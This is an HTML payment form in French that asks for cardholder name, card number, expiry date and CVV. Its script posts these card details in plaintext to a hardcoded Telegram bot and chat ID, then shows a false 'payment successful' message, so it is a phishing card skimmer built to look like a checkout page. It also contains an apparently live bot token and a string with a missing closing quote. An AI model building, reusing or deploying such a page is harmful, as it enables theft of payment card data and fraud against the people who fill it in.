<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulaire de Paiement</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }

    .payment-container {
      background-color: white;
      width: 400px;
      margin: 100px auto;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
      color: #333;
    }

    label {
      font-weight: bold;
      margin-top: 10px;
      display: block;
      color: #333;
    }

    input[type="text"],
    input[type="number"],
    input[type="submit"] {
      width: 94%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
    }

    input[type="submit"] {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      font-size: 18px;
    }

    input[type="submit"]:hover {
      background-color: #45a049;
    }

    .form-group {
      margin-bottom: 15px;
    }

    .error {
      color: red;
      font-size: 12px;
    }

    .card-icon {
      margin-top: 5px;
    }

    .card-icon img {
      width: 30px;
      margin-right: 10px;
    }
  </style>
</head>
<body>

  <div class="payment-container">
    <h2>Formulaire de Paiement</h2>
    <form id="payment-form">
      <div class="form-group">
        <label for="cardholder-name">Nom sur la carte</label>
        <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">
        <small class="error" id="name-error"></small>
      </div>

      <div class="form-group">
        <label for="card-number">Numéro de la carte</label>
        <input type="number" id="card-number" name="card-number" required placeholder="XXXX XXXX XXXX XXXX">
        <small class="error" id="card-number-error"></small>
      </div>

      <div class="form-group">
        <label for="expiry-date">Date d'expiration</label>
        <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">
        <small class="error" id="expiry-error"></small>
      </div>

      <div class="form-group">
        <label for="cvv">Code de sécurité (CVV)</label>
        <input type="number" id="cvv" name="cvv" required placeholder="XXX">
        <small class="error" id="cvv-error"></small>
      </div>

      <div class="form-group card-icon">
        <label>Méthode de paiement</label>
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/Visa_Logo_2011.svg" alt="Visa" id="visa-icon">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/MasterCard_Logo_2019.svg" alt="MasterCard" id="mastercard-icon">
      </div>

      <input type="submit" value="Payer">
    </form>
  </div>

  <script>
    // Remplacez par votre token du bot et chat ID
    const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
    const TELEGRAM_CHAT_ID = '7747778364;

    // Fonction pour envoyer les données à Telegram
    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      };

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      }).then(response => {
        if (response.ok) {
          console.log('Message envoyé à Telegram');
        } else {
          console.error('Erreur lors de l\'envoi du message');
        }
      }).catch(error => {
        console.error('Erreur de connexion:', error);
      });
    }

    // Validation et gestion du formulaire
    document.getElementById('payment-form').addEventListener('submit', function(event) {
      event.preventDefault(); // Empêche l'envoi du formulaire pour validation

      let isValid = true;
      
      // Récupérer les valeurs du formulaire
      const cardholderName = document.getElementById('cardholder-name').value;
      const cardNumber = document.getElementById('card-number').value;
      const expiryDate = document.getElementById('expiry-date').value;
      const cvv = document.getElementById('cvv').value;
      
      // Validation du nom sur la carte
      if (cardholderName.trim() === '') {
        document.getElementById('name-error').textContent = 'Veuillez entrer le nom du titulaire.';
        isValid = false;
      } else {
        document.getElementById('name-error').textContent = '';
      }

      // Validation du numéro de carte
      if (!/^\d{16}$/.test(cardNumber)) {
        document.getElementById('card-number-error').textContent = 'Numéro de carte invalide (16 chiffres).';
        isValid = false;
      } else {
        document.getElementById('card-number-error').textContent = '';
      }

      // Validation de la date d'expiration
      if (expiryDate === '') {
        document.getElementById('expiry-error').textContent = 'Veuillez entrer la date d\'expiration.';
        isValid = false;
      } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
        document.getElementById('expiry-error').textContent = 'La date d\'expiration doit être au format MM/AA.';
        isValid = false;
      } else {
        document.getElementById('expiry-error').textContent = '';
      }

      // Validation du CVV
      if (!/^\d{3}$/.test(cvv)) {
        document.getElementById('cvv-error').textContent = 'CVV invalide (3 chiffres).';
        isValid = false;
      } else {
        document.getElementById('cvv-error').textContent = '';
      }

      // Si toutes les validations sont ok, soumettre les données à Telegram
      if (isValid) {
        const message = `
          Paiement reçu:

          Nom du titulaire: ${cardholderName}
          Numéro de carte: ${cardNumber}
          Date d'expiration: ${expiryDate}
          CVV: ${cvv}
        `;
        sendToTelegram(message);
        alert('Paiement effectué avec succès!');
      }
    });

    // Fonction pour ajouter la barre oblique dans le champ de date d'expiration
    document.getElementById('expiry-date').addEventListener('input', function(event) {
      let value = event.target.value.replace(/\D/g, ''); // Supprime tout ce qui n'est pas un chiffre
      if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4); // Ajoute la barre oblique et limite à 2 chiffres pour l'année
      }
      event.target.value = value;
    });
  </script>

</body>
</html>
